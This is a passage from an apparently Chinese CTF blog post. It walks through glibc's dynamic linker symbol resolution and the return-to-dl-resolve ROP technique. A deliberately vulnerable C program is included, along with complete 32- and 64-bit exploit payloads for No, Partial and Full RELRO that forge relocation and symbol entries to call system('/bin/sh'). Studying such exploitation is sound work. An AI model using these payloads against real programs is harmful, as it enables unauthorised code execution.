  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);

  // 检查version
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum =
        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
      version = &amp;l-&gt;l_versions[ndx];
      if (version-&gt;hash == 0)
        version = NULL;
    }

      /* We need to keep the scope around so do some locking.  This is
     not necessary for objects which cannot be unloaded or when
     we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
      // 通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址
      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
    THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址
      value = DL_FIXUP_MAKE_VALUE (result,
                   sym ? (LOOKUP_VALUE_ADDRESS (result)
                      + sym-&gt;st_value) : 0);
    }
  else
    {
      // 如果Symbol已经找到了
      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);
      result = l;
    }
  // value为libc基址加上要解析函数的偏移地址，即实际地址
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__builtin_expect (GLRO(dl_bind_not), 0))
    return value;
  // 把value写入对应的GOT中
  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
</code></pre>
<h5 id="dl-lookup-symbol-x-（-dl-lookup-x-）"><a href="#dl-lookup-symbol-x-（-dl-lookup-x-）" class="headerlink" title="_dl_lookup_symbol_x()（_dl_lookup_x()）"></a><code>_dl_lookup_symbol_x()</code>（<code>_dl_lookup_x()</code>）</h5><p><code>_dl_lookup_symbol_x()</code> 以及 <code>_dl_lookup_x()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html" target="_blank" rel="noopener"><code>glibc/elf/dl-look-up.c</code></a> 中实现。其中根据 <code>strtab + sym-&gt;st_name</code> 来查找符号表。理论上可以通过遍历 <code>.dynsym</code> 中的每个元素的 <code>st_name</code> 来获取 <code>.dynstr</code> 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。<code>_dl_lookup_symbol_x()</code> 中则通过哈希表（GNU Hash）来进行查找：</p>
<pre><code class="cpp">static uint_fast32_t
dl_new_hash (const char *s)
{
  uint_fast32_t h = 5381;
  for (unsigned char c = *s; c != &#39;\0&#39;; c = *++s)
    h = h * 33 + c;
  return h &amp; 0xffffffff;
}
</code></pre>
<p>可以用 Python 实现这个函数：</p>
<pre><code class="python">In [1]: def dl_new_hash(s):
   ...:   h = 5381
   ...:   for c in s:
   ...:     h = 33 * h + ord(c)
   ...:   return h &amp; 0xffffffff
   ...:

In [2]: hex(dl_new_hash(&#39;__isoc99_scanf&#39;))
Out[2]: &#39;0xeafe348dL&#39;
</code></pre>
<p><code>_dl_lookup_symbol_x()</code> 中，先会调用 <code>dl_new_hash()</code> 来计算 Symbol Name 的哈希值，然后调用 <code>do_lookup_x()</code> 来查找对应的 Symbol：</p>
<pre><code class="cpp">/* Search loaded objects&#39; symbol tables for a definition of the symbol
   UNDEF_NAME, perhaps with a requested version for the symbol.

   We must never have calls to the audit functions inside this function
   or in any function which gets called.  If this would happen the audit
   code might create a thread which can throw off all the scope locking.  */
lookup_t
internal_function
_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,
             const ElfW(Sym) **ref,
             struct r_scope_elem *symbol_scope[],
             const struct r_found_version *version,
             int type_class, int flags, struct link_map *skip_map)
{
  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希
  unsigned long int old_hash = 0xffffffff;
  struct sym_val current_value = { NULL, NULL };
  struct r_scope_elem **scope = symbol_scope;

  ...

  /* Search the relevant loaded objects for a definition.  */
  for (size_t start = i; *scope != NULL; start = 0, ++scope)
    {
      int res = do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,
                 &amp;current_value, *scope, start, version, flags,
                 skip_map, type_class, undef_map);
      if (res &gt; 0)
    break;

  ...

  *ref = current_value.s;
  return LOOKUP_VALUE (current_value.m);
}
</code></pre>
<p>在 <code>do_lookup_x()</code> 中有一个大循环，主要是根据 Symbol Name 的哈希值模 <code>l_nbuckets</code> 作为下标，从 <code>l_gnu_buckets</code> 中获取一个 <code>bucket</code>。然后根据 bucket 从 <code>l_gnu_chain_zero</code> 取出一个哈希值来进行比较，如果正确，那么当前的 <code>bucket</code> 的值就是目标 <code>.dynsym</code> 的下标；如果不正确，将 <code>bucket</code> 的值加 1。最后返回 Symbol Name 对应的 <code>.dynsym</code>：</p>
<pre><code class="cpp">/* Inner part of the lookup functions.  We return a value &gt; 0 if we
   found the symbol, the value 0 if nothing is found and &lt; 0 if
   something bad happened.  */
static int
__attribute_noinline__
do_lookup_x (const char *undef_name, uint_fast32_t new_hash,
         unsigned long int *old_hash, const ElfW(Sym) *ref,
         struct sym_val *result, struct r_scope_elem *scope, size_t i,
         const struct r_found_version *const version, int flags,
         struct link_map *skip, int type_class, struct link_map *undef_map)
{
  size_t n = scope-&gt;r_nlist;
  /* Make sure we read the value before proceeding.  Otherwise we
     might use r_list pointing to the initial scope and r_nlist being
     the value after a resize.  That is the only path in dl-open.c not
     protected by GSCOPE.  A read barrier here might be to expensive.  */
  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));
  struct link_map **list = scope-&gt;r_list;

  do
    {
  ...

      /* The tables for this map.  */
      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);
      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);

  ...
      if (__builtin_expect (bitmask != NULL, 1))
    {
      ElfW(Addr) bitmask_word
        = bitmask[(new_hash / __ELF_NATIVE_CLASS)
              &amp; map-&gt;l_gnu_bitmask_idxbits];

      unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);
      unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)
                   &amp; (__ELF_NATIVE_CLASS - 1));

      if (__builtin_expect ((bitmask_word &gt;&gt; hashbit1)
                &amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1, 0))
        {
        // 从l_gnu_buckets中获取一个bucket
          Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash
                             % map-&gt;l_nbuckets];
          if (bucket != 0)
        {
      // 从l_gnu_chain_zero取出一个哈希值
          const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];

          do
            if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0) // 比较哈希值
              {
            symidx = hasharr - map-&gt;l_gnu_chain_zero;
            sym = check_match (&amp;symtab[symidx]);
            if (sym != NULL)
              goto found_it;
              }
          while ((*hasharr++ &amp; 1u) == 0);
        }
        }
      /* No symbol found.  */
      symidx = SHN_UNDEF;
    }
  ...
    }

  /* We have not found anything until now.  */
  return 0;
}
</code></pre>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：</p>
<ul>
<li>根据 <code>reloc_arg</code> 加载 Symbol Name</li>
<li>根据 <code>link_map</code> 中依次在每个 Library 中找 Symbol</li>
<li>计算 Symbol 的 Hash</li>
<li>用 Bloom Filter 检查 Symbol 是否存在（不是很重要）</li>
<li>在 Hash Bucket 和 Chain 中找 Symbol，若 <code>st_name</code> 符合则找到</li>
<li>检查 <code>version</code> 是否正确（不太重要）</li>
<li>填写 GOT 并回传 Symbol 的地址</li>
</ul>
<p>而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 <code>.dynsym</code> 的方式来定位想要的函数。</p>
<h1 id="Return-to-Dynamic-Resolver"><a href="#Return-to-Dynamic-Resolver" class="headerlink" title="Return to Dynamic Resolver"></a>Return to Dynamic Resolver</h1><p>一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 <code>_dl_runtime_resolve</code> 的参数，让 <code>_dl_fixup</code> 解析出我们要的 Symbol：</p>
<ul>
<li>参数通过栈传递，x86 和 x64 都可以使用</li>
<li>可以直接 CALL PLT0，这样就只需要传 <code>reloc_arg</code></li>
<li>需要控制 <code>link_map</code> 的时候可以 JMP PLT0 的第二条指令</li>
<li>不需要泄漏信息和 libc 版本，百分之百稳定 get shell</li>
</ul>
<h2 id="What-is-RELRO"><a href="#What-is-RELRO" class="headerlink" title="What is RELRO"></a>What is RELRO</h2><p>Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：</p>
<ul>
<li>No RELRO：所有相关的数据部分都能写</li>
<li>Partial RELRO（gcc 默认设定的值）：<code>.dynamic</code>、<code>.dynsym</code>、<code>.dynstr</code> 等部分只读</li>
<li>Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 <code>link_map</code> 和 Dynamic Resolver 的指针可以利用</li>
</ul>
<p>下面根据三种情况分析不同的攻击方法。程序源码如下：</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

char buf[1000000];

int main() {
    char local[10];
//    write(1, &quot;&gt; &quot;, 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏
    int len = read(0, buf, sizeof(buf));
    memcpy(local, buf, len);
    return 0;
}
</code></pre>
<h2 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h2><p>直接伪造 <code>.dynstr</code>，通过 <code>readelf</code> 找到 <code>.dynamic</code> 中 <code>DT_STRTAB</code> 的位置，把原本的 <code>.dynstr</code> 指向可控制的内存（在上面放 <code>&quot;system\x00&quot;</code>），然后跳到一个还没有解析过的 Symbol 上，如 <code>__gmon_start__</code>。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：</p>
<pre><code class="python">def memcpy(dst, src, length):
    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

st_name = 0x38
payload = (
    ((
        &#39;A&#39; * 18 + # padding
        p32(buf + 1024 + 4) # set esp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(dynstr_addr + 4, buf + 2048, 4) +
        p32(gmon_start_plt) +
        p32(0xdeadbeef) +
        p32(buf + 2048 + 12) # &amp;&quot;/bin/sh\x00&quot;
    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048
    p32(buf + 2048 + 4 - st_name) + # set strtab=&amp;&quot;system\x00&quot;
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<p>64 位下同理：</p>
<pre><code class="python">def csu(func, rdi, rsi, rdx):
  payload = (
        p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +
        p64(0x400650) + 56 * &#39;\x00&#39;
  )
  return payload

def memcpy(dst, src, length):
    return csu(memcpy_got, dst, src, length)

payload = (
    ((
        &#39;A&#39; * 14 + # padding
        p64(buf + 1024 - 8) + # set rbp=buf+1024-8
        p64(leave_ret) # stack pivot ; set rsp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(dynstr_addr + 8, buf + 2048, 8) +
        p64(pop_rdi_ret) +
        p64(buf + 2048 + 16) +
        p64(gmon_start_plt)
    ).ljust(2048, &#39;\x00&#39;) + # buf+2048
    p64(buf + 2048 + 8 - st_name) + # set strtab=&amp;&quot;system\x00&quot;
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<h2 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h2><p>构造一个假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>），使 <code>r_offset</code> 在可写位置，<code>r_info</code> 使 <code>&amp;.dynsym[r_info&gt;&gt;8]</code>（64 位下是 <code>&amp;.dynsym[r_info&gt;&gt;32]</code>）可控。然后传一个特别大的 <code>reloc_arg</code> 进去，使 <code>.rel.plt+reloc_arg</code> 落在假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>）上。接着构造一个假的 <code>Elf32_Sym</code>（<code>Elf64_Sym</code>），其中构造 <code>st_name</code> 使 <code>.dynstr+st_name</code> 可控（放上 <code>&quot;system\x00&quot;</code>）</p>
<p>如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 的参数可以放进这块内存。其中 <code>.gnu.version[r_info&gt;&gt;8]</code> 要为 0，或者把 <code>l_info[VERSYMIDX (DT_VERSYM)]</code> 中的内容清空。由于我们构造的伪 Symbol 中的 <code>r_info</code> 过大，使得 <code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code> 读取出错，如果 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code> 的值为 NULL 就不会出错，如下：</p>
<pre><code class="cpp">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
          version = &amp;l-&gt;l_versions[ndx];
          if (version-&gt;hash == 0)
            version = NULL;
        }
</code></pre>
<p>32 位下可以构造如下 payload：</p>
<pre><code class="python">payload = (
    ((
        &#39;A&#39; * 18 + # padding
        p32(buf + 1024 + 4) # set esp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        p32(plt0) +
        p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048
        p32(0xdeadbeef) +
        p32(buf + 2048 + 36)
    ).ljust(2048, &#39;\x00&#39;) + # buf+2048
    # Elf32_Rel
    p32(buf) + # r_offset
    p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info
    p32(0) + # padding
    # Elf32_Sym &lt;= buf+2048+12
    p32(buf + 2048 + 28 - dynstr) + # st_name
    p32(0) + # st_value
    p32(0) + # st_size
    p32(0x12) + # st_info
    # buf+2048+28
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<p>64 位有一些地方不太一样，比如说结构体的大小等，其中 <code>reloc_arg</code> 的宏定义也和 32 位不同，上文也提到了。不过 <code>Elf64_Sym</code> 结构体的大小还是跟 32 位下的 <code>Elf32_Sym</code> 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 <code>__libc_csu_init</code> 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 <code>memcpy</code> 到 <code>link_map</code> 上来改 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>，所以借助了 <code>read</code> 和 <code>write</code> 来实现：</p>
<pre><code class="python">reloc_arg = (buf + 2048 + 16 - relplt) / 24
payload = (
    ((
        &#39;A&#39; * 14 + # padding
        p64(buf + 1024 - 8) + # set rbp=buf+1024-8
        p64(leave_ret) # stack pivot ; set rsp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
        write(1, 0, 0x1c8+8) + # buf+1024+240
        memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360
        read(0, 0, 0x1c8+8) + # buf+1024+480 ; l-&gt;l_info[VERSYMIDX (DT_VERSYM)]=NULL
        p64(pop_rdi_ret) +
        p64(buf + 2048 + 56) +
        p64(plt0) +
        p64(reloc_arg) # set reloc_arg
    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048
    16 * &#39;\x00&#39; + # padding
    # Elf64_Rela
    p64(buf) + # r_offset
    p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) &lt;&lt; 32)) + # r_info
    # Elf64_Sym &lt;= buf+2048+32
    p32(buf + 2048 + 48 - dynstr) + # st_name
    p32(0x12) + # st_info
    p32(0) +
    p32(0) +
    # buf+2048+48
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<p>Partial RELRO 的第二种方法是直接修改 <code>link_map</code>，将 <code>l_info[DT_STRTAB]</code> 指向构造出来的 <code>Elf32_Dyn</code>（<code>Elf64_Dyn</code>）来伪造 <code>.dynstr</code>。然后呼叫 <code>__gmon_start__</code> 并在对应 <code>st_name</code> 的地址处放上 <code>&quot;system\x00&quot;</code>。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 <code>*(*(pointer)+offset)=value</code>。32 位下构造如下 payload：</p>
<pre><code class="python">def memcpy(dst, src, length):
    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

payload = (
    ((
        &#39;A&#39; * 18 + # padding
        p32(buf + 1024 + 4) # set esp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20
        memcpy(buf, 0, 56) + # buf+1024+40
        memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60
        memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80
        memcpy(0, buf, 56) + # buf+1024+100
        p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)
    ).ljust(2048, &#39;\x00&#39;) + # buf+2048
    p32(buf + 2048 + 4) +
    p32(5) +
    p32(buf + 2048 + 12 - st_name) +
    # buf+2048+12
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<p>64 位下对 <code>link_map</code> 的修改同样借助了泄漏来实现：</p>
<pre><code class="python">payload = (
    ((
        &#39;A&#39; * 14 + # padding
        p64(buf + 1024 - 8) + # set rbp=buf+1024-8
        p64(leave_ret) # stack pivot ; set rsp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
        memcpy(buf, 0, 112) + # buf+1024+240
        memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360
        write(1, buf, 112) + # buf+1024+480
        memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600
        read(0, 0, 112) + # buf+1024+720
        p64(pop_rdi_ret) +
        p64(buf + 2048 + 32) +
        p64(gmon_start_plt)
    ).ljust(2048, &#39;\x00&#39;) + # buf+2048
    p64(buf + 2048 + 8) +
    p64(5) +
    p64(buf + 2048 + 24 - st_name) +
    # data+24
    &#39;system\x00\x00&#39; +
    &#39;/bin/sh\x00&#39;
)
</code></pre>
<h2 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h2><p>GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 <code>link_map</code> 和 Dynamic Resolver：</p>
<ul>
<li>找回 <code>link_map</code>：<code>.dynamic</code> 中 <code>DT_BUG</code> 指向 <code>r_debug</code> 结构，<code>r_debug</code> 中 <code>r_map</code> 指向 <code>link_map</code>；</li>
<li>找回 Dynamic Resolver：用 <code>l_next</code> 找下一个 Library，然后用 <code>l_info[DT_PLTGOT]</code> 找出 Library 的 <code>.got.plt</code> 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 <code>_dl_runtime_resolve</code>）。</li>
</ul>
<p>以 32 位的程序为例，下面是 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的查找过程：</p>
<pre><code class="gdb">(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)
$1 = {
  d_tag = 0x15,
  d_un = {
    d_val = 0xf7ffd928,
    d_ptr = 0xf7ffd928
  }
}
(gdb) p/x *(struct r_debug *)0xf7ffd928
$2 = {
  r_version = 0x1,
  r_map = 0xf7ffd940,
  r_brk = 0xf7febae8,
  r_state = 0x0,
  r_ldbase = 0xf7fdd000
}
(gdb) p/x *(struct link_map *)0xf7ffd940
$3 = {
  l_addr = 0x0,
  l_name = 0xf7ffdc2c,
  l_ld = 0x8049ee8,
  l_next = 0xf7ffdc30,
  l_prev = 0x0,
  l_real = 0xf7ffd940,
  l_ns = 0x0,
  l_libname = 0xf7ffdc20,
  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,
    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 &lt;repeats 25 times&gt;, 0x8049f20},
  l_phdr = 0x8048034,
  l_entry = 0x8048350,
  l_phnum = 0x9,
  l_ldnum = 0x0,
  ...
(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_info[3]
$4 = 0x0
(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_next-&gt;l_info[3]
$5 = 0xf7fd2de0
(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0
$6 = {
  d_tag = 0x3,
  d_un = {
    d_val = 0xf7fd3000,
    d_ptr = 0xf7fd3000
  }
}
(gdb) x/3wx 0xf7fd3000
0xf7fd3000:    0x0019bd88    0xf7fd7770    0xf7ff04e0
(gdb) x/i 0xf7ff04e0
   0xf7ff04e0 &lt;_dl_runtime_resolve&gt;:    push   eax
</code></pre>
<p>32 位下的构造如下：</p>
<pre><code class="python">payload = (
    ((
        &#39;A&#39; * 18 + # padding
        p32(buf + 1024 + 4) # set esp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) + # buf+1024
        memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20
        memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4
        memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60
        memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map-&gt;l_next=buf+20
        memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100
        memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map-&gt;l_next-&gt;l_next=buf+20
        memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140
        memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+52
        memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180
        memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12
        memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220
        memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16
        memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260
        memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280
        p32(0) + # _dl_runtime_resolve
        p32(0) + # link_map
        p32(reloc_arg) + # reloc_arg
        p32(0xdeadbeef) +
        p32(buf + 2048 + 36)
    ).ljust(2048, &#39;\x00&#39;) + # buf+2048
        # Elf32_Rel
        p32(buf) + # r_offset
        p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info
        p32(0) + # padding
        # Elf32_Sym &lt;= buf+2048+12
        p32(buf + 2048 + 28 - dynstr) + # st_name
        p32(0) + # st_value
        p32(0) + # st_size
        p32(0x12) + # st_info
        # buf+2048+28
        &#39;system\x00\x00&#39; +
        &#39;/bin/sh\x00&#39;
)
</code></pre>
<p>64 位下会需要更长的输入才能完成一系列的构造：</p>
<pre><code class="python">payload = (
    ((
        &#39;A&#39; * 14 + # padding
        p64(buf + 1024 - 8) + # set rbp=buf+1024-8
        p64(leave_ret) # stack pivot ; set rsp=buf+1024
    ).ljust(1024, &#39;\x00&#39;) +
        memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120
        memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8
        memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360
        memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l-&gt;l_next=buf+40
        memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600
        memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l-&gt;l_next-&gt;l_next=buf+40
        memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840
        memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+104
        memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080
        memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24
        memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320
        memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32
        memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560
        write(1, 0, 0x1c8+8) + # buf+1024+1680
        memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800
        read(0, 0, 0x1c8+8) + # buf+1024+1920
        memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040
        memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160
        p64(pop_rdi_ret) +
        p64(buf + 4096 + 40) +
        p64(0) + # _dl_runtime_resolve
        p64(0) + # link_map
        p64(reloc_arg) # reloc_arg
    ).ljust(4096, &#39;\x00&#39;) + # buf+4096
        # Elf64_Rela
        p64(buf) + # r_offset
        p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) &lt;&lt; 32)) + # r_info
        # Elf64_Sym &lt;= buf+4096+16
        p32(buf + 4096 + 32 - dynstr) + # st_name
        p32(0x12) + # st_info
        p32(0) +
        p32(0) +
        # buf+4096+32
        &#39;system\x00\x00&#39; +
        &#39;/bin/sh\x00&#39;
)
</code></pre>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2020/04/12/2015-PlaidCTF-PlaidDB/">
                        <i class="fa fa-chevron-left"></i>
                        <span>2015-PlaidCTF-PlaidDB</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2020/04/02/初探Python沙箱逃逸/">
                        <span>初探Python沙箱逃逸</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
